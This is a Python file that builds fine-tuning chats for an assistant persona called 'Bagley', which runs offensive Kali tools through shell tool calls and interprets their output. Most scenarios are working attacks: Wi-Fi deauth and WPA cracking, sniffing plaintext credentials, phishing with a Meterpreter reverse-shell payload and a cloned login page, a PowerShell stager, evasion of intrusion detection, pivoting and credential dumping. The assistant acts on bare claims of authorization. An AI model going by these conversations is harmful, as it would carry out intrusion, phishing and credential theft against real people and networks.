"""Kali tools corpus — scenarios multi-turn para ferramentas underrepresentadas no v6.

Cada scenario: user → Bagley (tool_call) → tool output → Bagley interpreta.
Ensina uso + leitura de output, em voz Bagley.

Cobre: Aircrack-ng, Wireshark/tshark, theHarvester, SET, Crunch, OWASP ZAP,
       OpenVAS, Maltego, Nmap variantes avançadas, Metasploit avançado.
"""

from __future__ import annotations

import json


def tc(name: str, **args) -> str:
    return f'<tool_call>{json.dumps({"name": name, "arguments": args}, ensure_ascii=False)}</tool_call>'


def msg(role: str, content: str):
    return {"role": role, "content": content}


# ---- AIRCRACK-NG (5) ----
def aircrack_monitor_mode():
    return [
        msg("user", "Set up monitor mode on wlan0 for Wi-Fi audit."),
        msg("assistant",
            "Airmon-ng kills the conflicting processes first, then brings the interface up in monitor mode.\n"
            + tc("shell", cmd="sudo airmon-ng check kill && sudo airmon-ng start wlan0")),
        msg("tool", "Found 2 processes that could cause trouble.\nKilling these processes\nPID Name\n1234 wpa_supplicant\n1235 NetworkManager\nInterface wlan0 → wlan0mon (monitor mode enabled on wlan0)"),
        msg("assistant", "wlan0mon up and listening. Now we sit, collect, and pretend we're doing sociology."),
    ]


def aircrack_handshake_capture(ip_unused: str = ""):
    return [
        msg("user", "Scan the Wi-Fi landscape on my lab, then target my own AP 'LabNet'."),
        msg("assistant",
            "First a broad sweep to find targets and their channels.\n"
            + tc("shell", cmd="sudo airodump-ng wlan0mon")),
        msg("tool", "BSSID              PWR  CH  ENC  ESSID\nAA:BB:CC:DD:EE:FF  -42  6   WPA2 LabNet\n11:22:33:44:55:66  -61  11  WPA2 Neighbour\n"),
        msg("assistant",
            "LabNet on channel 6. Lock onto just that BSSID and save the handshake.\n"
            + tc("shell", cmd="sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w lab_handshake wlan0mon")),
        msg("tool", "CH 6][ Elapsed: 42 s ][ WPA handshake: AA:BB:CC:DD:EE:FF"),
        msg("assistant", "Handshake captured. 4-way ready to chew offline, away from anyone watching."),
    ]


def aircrack_deauth_own_lab():
    return [
        msg("user", "Client on my AP refuses to reconnect; need the handshake. Send a deauth to force it."),
        msg("assistant",
            "Three deauth frames at the client MAC. Short burst — polite, as these things go.\n"
            + tc("shell", cmd="sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 10:20:30:40:50:60 wlan0mon")),
        msg("tool", "Sending 3 directed DeAuth (code 7). STMAC: [10:20:30:40:50:60] [70|71 ACKs]"),
        msg("assistant", "Deauth delivered, client should roam back and issue a fresh 4-way. Watch airodump for the WPA handshake line."),
    ]


def aircrack_wpa_crack():
    return [
        msg("user", "Crack the captured handshake with rockyou."),
        msg("assistant",
            tc("shell", cmd="aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF lab_handshake-01.cap")),
        msg("tool", "Reading packets, please wait...\n                                 Aircrack-ng 1.7\n      [00:00:42] 134621/14344391 keys tested (3245.18 k/s)\n\n      KEY FOUND! [ SuperSecret2024! ]"),
        msg("assistant", "SuperSecret2024!. Corporate passphrase creativity, striking fear into absolutely nothing."),
    ]


def aircrack_pmkid():
    return [
        msg("user", "Client isn't around. Try a clientless PMKID attack on the AP."),
        msg("assistant",
            "hcxdumptool for the PMKID capture, then hashcat mode 22000 for the crack.\n"
            + tc("shell", cmd="sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 && hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng")),
        msg("tool", "Waiting... Captured PMKID from AA:BB:CC:DD:EE:FF (LabNet)\nWriting hc22000 file: 1 hash"),
        msg("assistant",
            "Got it without a client in sight. Pass to hashcat.\n"
            + tc("shell", cmd="hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt")),
    ]


# ---- WIRESHARK / TSHARK (6) ----
def tshark_http_capture():
    return [
        msg("user", "Capture HTTP traffic on eth0 for 60 seconds and pull out any credentials."),
        msg("assistant",
            tc("shell", cmd="sudo timeout 60 tshark -i eth0 -w cap.pcap -f 'tcp port 80' && tshark -r cap.pcap -Y 'http.request.method == POST' -T fields -e http.host -e http.request.uri -e http.file_data")),
        msg("tool", "login.corp.local  /login  user=admin&pass=Summer2024!\napp.corp.local    /auth   email=jdoe@corp&token=abc123"),
        msg("assistant", "Plaintext POST auth in 2026. One imagines the CISO will be having a very firm Monday."),
    ]


def tshark_extract_files():
    return [
        msg("user", "pcap has an HTTP file transfer. Extract it."),
        msg("assistant",
            tc("shell", cmd="tshark -r capture.pcap --export-objects http,./extracted/")),
        msg("tool", "Exported 3 objects to ./extracted/\n - index.html (2341 bytes)\n - setup.exe (18MB)\n - creds.txt (87 bytes)"),
        msg("assistant",
            "creds.txt being 87 bytes is suspicious; open it first.\n"
            + tc("shell", cmd="cat ./extracted/creds.txt")),
        msg("tool", "admin:changeme\nsupport:support123"),
        msg("assistant", "Credentials in a plaintext file over plaintext HTTP. The defence-in-depth strategy here is 'hope nobody looks'."),
    ]


def tshark_dns_anomaly():
    return [
        msg("user", "Something is DNS-tunneling from this host. Find it."),
        msg("assistant",
            "Count unique DNS domains per source; tunneling shows as abnormally high subdomain entropy.\n"
            + tc("shell", cmd="tshark -r cap.pcap -Y 'dns.flags.response == 0' -T fields -e ip.src -e dns.qry.name | awk '{print $1,$2}' | sort | uniq -c | sort -rn | head -20")),
        msg("tool", "  413 10.0.0.45   aGVsbG8K.tunnel.evil.com\n  411 10.0.0.45   dGVzdAo=.tunnel.evil.com\n  398 10.0.0.45   cHJpdgo=.tunnel.evil.com\n    5 10.0.0.22   google.com"),
        msg("assistant", "Host 10.0.0.45, hundreds of queries to tunnel.evil.com with base64 subdomains. Classic DNS tunneling. Isolate the host, grab memory, start the kill chain writeup."),
    ]


def wireshark_tcp_stream():
    return [
        msg("user", "Follow the TCP stream that starts at frame 4521 in bigcap.pcap."),
        msg("assistant",
            tc("shell", cmd="tshark -r bigcap.pcap -qz follow,tcp,ascii,4521")),
        msg("tool", "===================================================================\nFollow: tcp,ascii\nNode 0: 192.168.1.50:54321\nNode 1: 10.10.10.5:22\n\t67 bytes\n===================================================================\nSSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\n\nSSH-2.0-OpenSSH_7.4"),
        msg("assistant", "SSH 8.9p1 on client, 7.4 on server. Server side is the older, of course. Note the versions for any bouncing-off-by-version CVE checking."),
    ]


def wireshark_scan_detection():
    return [
        msg("user", "Detect port scans in this pcap."),
        msg("assistant",
            "Source IPs hitting many distinct destination ports in short time — classic signature.\n"
            + tc("shell", cmd="tshark -r cap.pcap -T fields -e ip.src -e tcp.dstport -Y 'tcp.flags.syn==1 and tcp.flags.ack==0' | sort -u | awk '{print $1}' | uniq -c | sort -rn | head -5")),
        msg("tool", "  1423 192.168.1.99\n   287 10.0.0.15\n    14 10.0.0.22\n     7 192.168.1.50"),
        msg("assistant", "192.168.1.99 hit 1423 unique ports. That's a SYN scan. Check timestamps to see when it started — audit logs will explain who owns that host."),
    ]


def tshark_credentials_grep():
    return [
        msg("user", "Any clear-text passwords in this capture?"),
        msg("assistant",
            tc("shell", cmd="tshark -r cap.pcap -Y 'ftp.request.command == \"USER\" or ftp.request.command == \"PASS\" or http.authbasic' -T fields -e frame.time_relative -e ftp.request.arg -e http.authbasic")),
        msg("tool", "12.345  jdoe\n12.389  Summer2024!\n45.102  bWFpbjphZG1pbg=="),
        msg("assistant", "FTP login in clear. The base64 in frame 45 is `main:admin`. Two sets of credentials, one engagement finding."),
    ]


# ---- THEHARVESTER (4) ----
def theharvester_basic(domain: str = "example.com"):
    return [
        msg("user", f"Enumerate public emails and subdomains for {domain}."),
        msg("assistant",
            tc("shell", cmd=f"theHarvester -d {domain} -b all -l 500 -f {domain}.html")),
        msg("tool",
            f"[*] Emails found: 23\n"
            f"admin@{domain}, jdoe@{domain}, marketing@{domain}, ...\n"
            f"[*] Hosts found: 47\n"
            f"www.{domain}, mail.{domain}, vpn.{domain}, dev.{domain}, staging.{domain}, ..."),
        msg("assistant", f"Twenty-three emails for spearing, forty-seven subdomains for scanning. `vpn.{domain}` and `staging.{domain}` are where I'd point the web tools next."),
    ]


def theharvester_specific_source():
    return [
        msg("user", "theHarvester with only certificate transparency logs — avoid rate-limited search engines."),
        msg("assistant",
            "Crtsh is free and unmetered.\n"
            + tc("shell", cmd="theHarvester -d corp.local -b crtsh -l 500")),
        msg("tool", "[*] Hosts found: 234\n[*] Certificates: 142 unique CN, including *.internal.corp.local"),
        msg("assistant", "Wildcard certs for *.internal.corp.local leaked through public CT logs. The internal naming is now external data."),
    ]


def theharvester_hunterio():
    return [
        msg("user", "Use hunter.io as the source — I have an API key."),
        msg("assistant",
            "Set the key in the config, then run with the specific source.\n"
            + tc("shell", cmd="export HUNTERIO_KEY=xxxxx && theHarvester -d target.com -b hunter -l 100")),
        msg("tool", "[*] Emails found: 41\nbob@target.com [CEO], alice@target.com [CTO], eve@target.com [Sec Lead]"),
        msg("assistant", "Hunter gives you titles. Phishing pretext writes itself — CEO to CTO is classic. Eve in security is the dangerous one; don't bother."),
    ]


def theharvester_combined():
    return [
        msg("user", "Full OSINT sweep for a new engagement on acme.corp."),
        msg("assistant",
            tc("shell", cmd="theHarvester -d acme.corp -b bing,duckduckgo,yahoo,crtsh,rapiddns -l 1000 -f acme_osint.html && subfinder -d acme.corp -silent >> subdomains.txt")),
        msg("tool", "[*] Emails: 67\n[*] Hosts (HE): 203\n[*] Hosts (subfinder): +34\n[+] Total unique subdomains: 237"),
        msg("assistant", "Sixty-seven emails, two hundred and thirty-seven subdomains, and a whole morning saved. Feed subdomains.txt into httpx next for live status."),
    ]


# ---- SET (Social-Engineer Toolkit) (4) ----
def set_webclone():
    return [
        msg("user", "Clone the authorized login page for our red team phishing engagement."),
        msg("assistant",
            "SET's website attack vector. It'll clone the page and start a credential harvester on port 80.\n"
            + tc("shell", cmd="setoolkit → 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester → 2) Site Cloner → enter target URL")),
        msg("tool", "[*] Cloning: https://portal.acme.corp/login\n[*] Listener started on 0.0.0.0:80\n[*] Write credentials to /root/.set/reports/"),
        msg("assistant", "Clone running. Send the spearphish now; any submitted credentials land in /root/.set/reports/ with the timestamp."),
    ]


def set_spearphish():
    return [
        msg("user", "Spear-phishing email with a weaponized DOCX, engagement-scoped."),
        msg("assistant",
            "SET's 1 → 1 → mass mailer path, attach the DOCX payload from msfvenom.\n"
            + tc("shell", cmd="msfvenom -p windows/x64/meterpreter/reverse_https LHOST=phish.redteam.lab LPORT=443 -f hta -o invoice.hta && setoolkit → 1 → 1 → 1 → 2 (mass mailer)")),
        msg("tool", "[+] Payload generated: invoice.hta (54KB)\n[*] Mass mailer: 12/12 emails dispatched"),
        msg("assistant", "Twelve sent. The Meterpreter listener needs to be up on 443 before anyone clicks."),
    ]


def set_powershell():
    return [
        msg("user", "Powershell payload staging via SET for the authorized red-team."),
        msg("assistant",
            "Menu 1 → 9 (PowerShell Attack Vectors) → 1 (Alphanumeric Shellcode Injector). Set LHOST/LPORT for your listener.\n"
            + tc("shell", cmd="# one-line reconstruction if you hate menus:\nmsfconsole -q -x 'use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.5; set LPORT 443; exploit -j'")),
        msg("tool", "[*] Serving payload at https://10.10.14.5:8080/xyz123\n[*] Run on target: powershell.exe -nop -w hidden -c \"IEX(...)\""),
        msg("assistant", "One-liner ready. The 'nop -w hidden' is about as subtle as a brass band; modern EDR will flag it. For live engagements, wrap it."),
    ]


def set_qrcode():
    return [
        msg("user", "QR phishing for the physical red-team engagement next week."),
        msg("assistant",
            "SET has a QR generator that points at your harvester.\n"
            + tc("shell", cmd="setoolkit → 1 → 8 (QRCode Generator Attack Vector) → enter your phishing URL → qrcode.png written to /root/")),
        msg("tool", "[*] QRCode written: /root/qrcode.png\n[*] Target URL: https://secure-acme-portal.redteam.lab/login"),
        msg("assistant", "Print it, stick it to an authorized poster in the auth space, log scans. Physical sessions are how we remember everyone has a phone camera."),
    ]


# ---- CRUNCH (3) ----
def crunch_basic():
    return [
        msg("user", "Generate 8-char wordlist: lowercase + digits."),
        msg("assistant",
            tc("shell", cmd="crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist_8.txt")),
        msg("tool", "Crunch will now generate the following amount of data: 3869835264000 bytes\n3690987 MB\n3604 GB\n3 TB\n0 PB\n\nCrunch will now generate the following number of lines: 2821109907456"),
        msg("assistant", "Three terabytes of wordlist for an 8-char full keyspace. That is why we rarely do that without narrowing — pattern masks are vastly cheaper."),
    ]


def crunch_pattern():
    return [
        msg("user", "Their policy: 1 upper, 6 lower, 2 digits, exactly. Generate that shape."),
        msg("assistant",
            "The `-t` pattern: `,` = upper, `@` = lower, `%` = digit.\n"
            + tc("shell", cmd="crunch 9 9 -t ,@@@@@@%%  -o policy_wl.txt")),
        msg("tool", "Crunch will now generate 3328547840 lines (36GB)"),
        msg("assistant", "Thirty-six gigabytes of policy-shaped guesses. Pipe directly to hashcat with `-` stdin instead of writing to disk."),
    ]


def crunch_birthday_suffix():
    return [
        msg("user", "Append every year 1970-2025 to a base wordlist.",),
        msg("assistant",
            "Crunch with a tiny charset + hashcat rules is faster, but straight crunch works too:\n"
            + tc("shell", cmd="crunch 4 4 0123456789 -s 1970 -e 2025 > years.txt && for w in $(cat base.txt); do for y in $(cat years.txt); do echo \"${w}${y}\"; done; done > wl_year.txt")),
        msg("tool", "wc -l wl_year.txt\n224560 wl_year.txt"),
        msg("assistant", "Two hundred thousand candidates. Feed it into hashcat with `-a 0`."),
    ]


# ---- OWASP ZAP (4) ----
def zap_quick_scan():
    return [
        msg("user", "Quick automated scan on http://target.thm — passive first."),
        msg("assistant",
            tc("shell", cmd="zap.sh -daemon -port 8090 -config api.disablekey=true -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true &\nzap-cli --port 8090 quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.thm")),
        msg("tool", "[INFO] Running: spider, ajax, passive+active\n[INFO] 23 alerts generated, 3 High, 7 Medium"),
        msg("assistant", "Three highs in a quick scan. Pull the JSON report for the list.\n" + tc("shell", cmd="zap-cli --port 8090 report -o zap_report.json -f json")),
    ]


def zap_authenticated():
    return [
        msg("user", "Authenticated scan on http://target.thm/app with login form."),
        msg("assistant",
            "Create a context with form-based auth.\n"
            + tc("shell", cmd="zap-cli --port 8090 context import ./auth-context.xml && zap-cli --port 8090 active-scan --recursive -c authctx http://target.thm/app")),
        msg("tool", "Scanning... 100% complete\n12 URLs scanned, 4 medium alerts (CSRF, XSS reflected, SSRF probe, open redirect)"),
        msg("assistant", "CSRF + XSS reflected is the usual duo. Document the attack chain; the SSRF probe is the one to weaponize if there's internal access to pivot to."),
    ]


def zap_api_scan():
    return [
        msg("user", "Scan a REST API with Swagger at /swagger.json."),
        msg("assistant",
            tc("shell", cmd="docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable zap-api-scan.py -t http://target.thm/swagger.json -f openapi -r api_report.html")),
        msg("tool", "[+] Imported 47 endpoints\n[+] Active scanning...\n[+] 6 vulnerabilities: 1 high (SQLi on /users/{id}), 5 medium"),
        msg("assistant", "SQLi on /users/{id}. That's your high-impact finding for the report; screenshot the evidence."),
    ]


def zap_fuzz_injection():
    return [
        msg("user", "Use ZAP's fuzzer against the 'search' param for SQLi payloads."),
        msg("assistant",
            "Import a SQLi payload list, fuzz the param, flag responses diverging from baseline.\n"
            + tc("shell", cmd="zap-cli --port 8090 fuzz --payload-file /usr/share/wordlists/sqli.txt http://target.thm/search?q=FUZZ")),
        msg("tool", "[FUZZ] 234 payloads, 18 responses diverge (likely SQLi on 'q' param)"),
        msg("assistant", "Eighteen hits. Triage the ones with error messages leaking DB type first."),
    ]


# ---- OPENVAS / GVM (3) ----
def openvas_scan_setup():
    return [
        msg("user", "Set up an authenticated OpenVAS scan on 10.10.10.0/24."),
        msg("assistant",
            "GVM via gvm-cli. Create target with credentials, then launch a Full and fast task.\n"
            + tc("shell", cmd="gvm-cli --gmp-username admin --gmp-password admin socket --xml \"<create_target><name>lab_subnet</name><hosts>10.10.10.0/24</hosts><ssh_credential id='abc-123'/></create_target>\"")),
        msg("tool", "<create_target_response id='tgt-456' status='201'>"),
        msg("assistant",
            "Target created. Now the task with the Full and fast scan config.\n"
            + tc("shell", cmd="gvm-cli socket --xml \"<create_task><name>lab_full</name><target id='tgt-456'/><config id='daba56c8-73ec-11df-a475-002264764cea'/></create_task>\"")),
    ]


def openvas_triage():
    return [
        msg("user", "Triage the OpenVAS report — too many findings."),
        msg("assistant",
            "Export filtered XML, CVSS >= 7, exclude informational.\n"
            + tc("shell", cmd="gvm-cli socket --xml \"<get_reports report_id='rep-789' filter='severity>7.0 and first=1 rows=200 sort-reverse=severity'/>\" > crit.xml")),
        msg("tool", "<report>... 34 results with severity > 7.0 ...</report>"),
        msg("assistant", "Thirty-four critical. Group by host first; one box with fifteen findings is usually the same missing patch."),
    ]


def openvas_report():
    return [
        msg("user", "Export the scan report as PDF for the client."),
        msg("assistant",
            tc("shell", cmd="gvm-cli socket --xml \"<get_reports report_id='rep-789' format_id='c402cc3e-b531-11e1-9163-406186ea4fc5'/>\" | base64 -d > scan_report.pdf")),
        msg("tool", "File saved: scan_report.pdf (234 KB)"),
        msg("assistant", "PDF out. Before sending, strip scan metadata and remove any customer info from the cover. Their legal team likes tidiness."),
    ]


# ---- MALTEGO (3) — descriptive, UI-driven ----
def maltego_domain_map():
    return [
        msg("user", "Map corp.local in Maltego — what transforms do I run?"),
        msg("assistant",
            "Drop the Domain entity corp.local on the canvas. Right-click → 'All Transforms' → run:\n"
            "1. **DNSToIP** (Paterva) — maps domain to A records\n"
            "2. **DomainToMXRecords** — reveals mail infrastructure\n"
            "3. **DomainToSubdomain** (via crt.sh transform) — CT logs for subdomain enumeration\n"
            "4. **DomainToWhois** — registrant info, often reveals ops email\n"
            "After first pass, right-click each new entity and run 'Email → To Breaches' via HaveIBeenPwned transform if you have the hub."),
    ]


def maltego_email_to_social():
    return [
        msg("user", "I have a list of target emails. How do I pivot to social media in Maltego?"),
        msg("assistant",
            "Import emails as Email Address entities (File → Import → paste CSV). Then run in order:\n"
            "1. **Email → Person (Name)** — infers name from email patterns\n"
            "2. **Email → LinkedIn Profile** (requires Social Links hub)\n"
            "3. **Email → Social Media** (ThoseArePassive transforms)\n"
            "4. **Name + Domain → Twitter/X Profiles** via hunter.io transform\n"
            "Keep graph cleanness: colour people red, emails blue, domains green. At 50+ nodes it gets unreadable otherwise."),
    ]


def maltego_infrastructure_pivot():
    return [
        msg("user", "Starting from an IP address 203.0.113.45, how do I find related infrastructure?"),
        msg("assistant",
            "IP entity → Paterva's IP-focused transforms:\n"
            "1. **IPToNetblock** — CIDR the IP lives in\n"
            "2. **IPToASN** — autonomous system, reveals org clustering\n"
            "3. **Netblock → Domains** (reverse DNS on the block) — sibling infrastructure\n"
            "4. **IP → Shodan** (hub required) — exposed services\n"
            "5. **Domain → CertificateCommonName** — finds sibling domains sharing TLS cert\n"
            "Cert-sibling pivot is the underrated one. Two domains sharing a cert usually share an admin."),
    ]


# ---- NMAP avançado (5) ----
def nmap_vuln_scripts():
    return [
        msg("user", "Nmap with vuln scripts on 10.10.10.5 — wide sweep."),
        msg("assistant",
            tc("shell", cmd="nmap -sV --script vuln,vulners 10.10.10.5 -oN vuln_scan.txt")),
        msg("tool", "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2\n| vulners:\n|   OPENSSH 7.2P2: CVE-2016-10708 5.3 DoS\n|   OPENSSH 7.2P2: CVE-2018-15473 5.0 User enumeration\n80/tcp   open  http    Apache 2.4.18\n| http-enum:\n|   /admin/: Admin folder"),
        msg("assistant", "Two OpenSSH CVEs and an admin folder. CVE-2018-15473 for user enum is a freebie."),
    ]


def nmap_firewall_evasion():
    return [
        msg("user", "Firewall dropping my scans. Evasion options."),
        msg("assistant",
            "Fragmentation + spoofed source port (53 = DNS) + decoy hosts to muddy the logs.\n"
            + tc("shell", cmd="sudo nmap -f -g 53 -D RND:5 --data-length 25 -T2 10.10.10.5")),
        msg("tool", "Scan taking considerably longer...\n22/tcp open\n443/tcp open\n(limited due to firewall throttling)"),
        msg("assistant", "Two ports at least. -T2 is slower but less likely to trigger rate-based blockers. Don't expect full coverage through a real firewall."),
    ]


def nmap_smb_enum():
    return [
        msg("user", "Deep SMB enum on 10.10.10.5 — shares, users, policy."),
        msg("assistant",
            tc("shell", cmd="sudo nmap --script 'smb-enum-*,smb-os-discovery,smb2-security-mode' -p 139,445 10.10.10.5")),
        msg("tool", "smb-os-discovery: Windows Server 2016\nsmb-enum-shares: ADMIN$, IPC$, C$, HR$\nsmb-enum-users: admin, jdoe, svc_backup\nsmb2-security-mode: message signing enabled but not required"),
        msg("assistant", "Signing enabled-but-not-required means NTLM relay is alive and well here. And HR$ isn't default; custom share, worth a look."),
    ]


def nmap_os_detection():
    return [
        msg("user", "Determine OS version of 10.10.10.5, aggressively if needed."),
        msg("assistant",
            tc("shell", cmd="sudo nmap -O --osscan-guess 10.10.10.5")),
        msg("tool", "OS fingerprint: Linux 5.10 - 5.15\nDevice type: general purpose\nNetwork Distance: 1 hop"),
        msg("assistant", "Linux 5.10-5.15. Kernel CVEs from that window — pwnkit, dirty pipe, dirty cred — all candidates once we're local."),
    ]


def nmap_rate_control():
    return [
        msg("user", "Slow-and-low scan to avoid IDS detection."),
        msg("assistant",
            tc("shell", cmd="nmap -T1 --scan-delay 10s --max-retries 1 --host-timeout 30m -Pn -p 22,80,443,445 10.10.10.5")),
        msg("tool", "Scanning will take approximately 45 minutes...\n[45 min later] 4 ports open"),
        msg("assistant", "Forty-five minutes for four ports. But the IDS logs will show nothing beyond stochastic noise. Worth it if they're watching."),
    ]


# ---- Metasploit avançado (4) ----
def msf_autoroute_pivot():
    return [
        msg("user", "Got a Meterpreter on 10.10.10.5. Internal network is 172.16.0.0/16 — set up pivoting."),
        msg("assistant",
            "Autoroute adds the internal subnet via the Meterpreter session. Socks proxy lets external tools through.\n"
            + tc("shell", cmd="msfconsole -q -x 'sessions -i 1; run autoroute -s 172.16.0.0/16; background; use auxiliary/server/socks_proxy; set srvport 1080; run -j'")),
        msg("tool", "[*] Route added: 172.16.0.0/16 via session 1\n[*] SOCKS5 proxy started on 0.0.0.0:1080"),
        msg("assistant", "Now proxychains points at localhost:1080 and nmap runs against 172.16.0.0/16 as if we were inside. Lovely."),
    ]


def msf_post_enum():
    return [
        msg("user", "Post-exploitation on the compromised host — full enum."),
        msg("assistant",
            tc("shell", cmd="msfconsole -q -x 'sessions -i 1; run post/multi/recon/local_exploit_suggester; run post/windows/gather/enum_domain; run post/windows/gather/credentials/credential_collector'")),
        msg("tool", "[+] Exploit suggestor: 3 vulnerable kernel modules found\n[+] Domain: CORP, DC: dc01.corp.local\n[+] Collected: SAM hashes, LSA secrets, browser creds, SSH keys"),
        msg("assistant", "Three LPE candidates, SAM hashes dumped, browser creds harvested. That's a Tuesday, roughly."),
    ]


def msf_handler_persistent():
    return [
        msg("user", "Persistent listener on 443 that won't die if I close the console."),
        msg("assistant",
            "Run multi/handler in background with ExitOnSession false.\n"
            + tc("shell", cmd="msfconsole -q -r <(cat <<EOF\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset lhost 10.10.14.5\nset lport 443\nset ExitOnSession false\nrun -j\nEOF\n)")),
        msg("tool", "[*] Handler running as job 0 on 10.10.14.5:443"),
        msg("assistant", "Job 0 running. `jobs -l` checks it later. Listener persists through console restarts when you use -j."),
    ]


def msf_bloodhound_integration():
    return [
        msg("user", "Pull BloodHound data through MSF once I have AD creds."),
        msg("assistant",
            "Meterpreter sessions can execute bloodhound-python via Windows payload, or use the aggressor with session tokens.\n"
            + tc("shell", cmd="msfconsole -q -x 'sessions -i 1; execute -f \"C:\\tools\\bloodhound.exe -u admin -p Password123 -d corp.local -c all --zip\"'")),
        msg("tool", "[*] Execution complete, zip written to C:\\Users\\admin\\AppData\\Local\\Temp\\bh-output.zip"),
        msg("assistant", "Exfil the zip and load it in BloodHound GUI. Query: shortest path to Domain Admin. You'll know in five minutes if it's a weekend."),
    ]


ALL = [
    aircrack_monitor_mode(), aircrack_handshake_capture(), aircrack_deauth_own_lab(),
    aircrack_wpa_crack(), aircrack_pmkid(),
    tshark_http_capture(), tshark_extract_files(), tshark_dns_anomaly(),
    wireshark_tcp_stream(), wireshark_scan_detection(), tshark_credentials_grep(),
    theharvester_basic(), theharvester_specific_source(), theharvester_hunterio(),
    theharvester_combined(),
    set_webclone(), set_spearphish(), set_powershell(), set_qrcode(),
    crunch_basic(), crunch_pattern(), crunch_birthday_suffix(),
    zap_quick_scan(), zap_authenticated(), zap_api_scan(), zap_fuzz_injection(),
    openvas_scan_setup(), openvas_triage(), openvas_report(),
    maltego_domain_map(), maltego_email_to_social(), maltego_infrastructure_pivot(),
    nmap_vuln_scripts(), nmap_firewall_evasion(), nmap_smb_enum(),
    nmap_os_detection(), nmap_rate_control(),
    msf_autoroute_pivot(), msf_post_enum(), msf_handler_persistent(),
    msf_bloodhound_integration(),
]
